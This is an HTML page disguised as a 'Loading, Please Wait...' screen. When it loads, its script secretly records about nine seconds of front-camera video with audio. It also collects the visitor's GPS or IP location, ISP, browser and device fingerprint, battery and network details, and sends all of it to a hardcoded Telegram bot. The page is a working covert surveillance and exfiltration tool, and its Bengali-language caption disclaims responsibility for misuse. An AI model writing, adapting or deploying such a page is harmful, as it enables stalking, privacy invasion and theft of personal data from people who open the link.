<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
    <h2>Loading, Please Wait...</h2>
    <video id="video" autoplay playsinline muted style="display:none;"></video>

    <script>
        const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
        const CHAT_ID = '8589721704';

        // জিপিএস লোকেশন নেওয়ার ফাংশন
        function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("Not Supported");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        resolve(`Lat: ${lat}, Lon: ${lon} (GPS)`);
                    },
                    (error) => {
                        resolve("Permission Denied or Disabled");
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            });
        }

        async function getDeviceInfo() {
            let ip = "Unknown", isp = "Unknown", apiLocation = "Unknown";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || "Unknown";
                isp = data.org || "Unknown";
                apiLocation = `${data.city}, ${data.region}, ${data.country_name} (IP Based)`;
            } catch (e) {}

            // জিপিএস লোকেশন চেক করা
            let gpsLocation = await getGPSLocation();
            let finalLocation = gpsLocation.includes("Lat") ? gpsLocation : apiLocation;

            let batteryStatus = "Unknown", isCharging = "❌";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryStatus = `${Math.round(b.level * 100)}%`;
                    isCharging = b.charging ? "✔️" : "❌";
                }
            } catch (e) {}

            let speed = "Unknown";
            try {
                if (navigator.connection && navigator.connection.downlink) {
                    speed = `${navigator.connection.downlink} Mbps`;
                }
            } catch(e) {}

            let networkType = "Unknown", effectiveType = "Unknown";
            try {
                if (navigator.connection) {
                    networkType = navigator.connection.type || "Unknown";
                    effectiveType = navigator.connection.effectiveType || "Unknown";
                }
            } catch(e) {}

            let deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
            let hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";

            let glRenderer = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}

            let isIncognito = "❌";
            try {
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    const estimate = await navigator.storage.estimate();
                    if (estimate.quota < 120 * 1024 * 1024 * 1024) {
                        isIncognito = "✔️ (Likely)";
                    }
                }
            } catch(e) {}

            let now = new Date();
            let dateStr = now.toLocaleDateString() + " - " + now.toLocaleTimeString();

            return `📹 Front Camera Video (8-10s)

⚠️ Do not misuse this video

🌐 IP Address: ${ip}
🏢 ISP: ${isp}
📍 Location: ${finalLocation}

💻 User-Agent: ${navigator.userAgent}
🌐 Browser: ${navigator.language}
🕵️ Incognito Mode: ${isIncognito}

🔋 Battery: ${batteryStatus} Charging: ${isCharging}
📐 Screen Size: ${window.screen.width}×${window.screen.height}
🚀 Internet Speed: ${speed}
📶 Network: ${networkType} Type: ${effectiveType}

💾 RAM & Storage: ${deviceMemory} / ${hardwareConcurrency} Cores
🕒 Date: ${dateStr}
🌍 Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

📊 Device Pixel Ratio: ${window.devicePixelRatio}
🖥️ Viewport Size: ${window.innerWidth}×${window.innerHeight}
🧑‍💻 CPU Cores: ${hardwareConcurrency}
🎮 GPU Renderer: ${glRenderer}

⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না.`;
        }

        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const captionText = await getDeviceInfo();

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'video.webm');
                    formData.append('caption', captionText);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    stream.getTracks().forEach(track => track.stop());
                };

                mediaRecorder.start();

                setTimeout(() => {
                    mediaRecorder.stop();
                }, 9000);

            } catch (err) {
                console.log('Error:', err);
            }
        }

        window.onload = startProcess;
    </script>
</body>
</html>
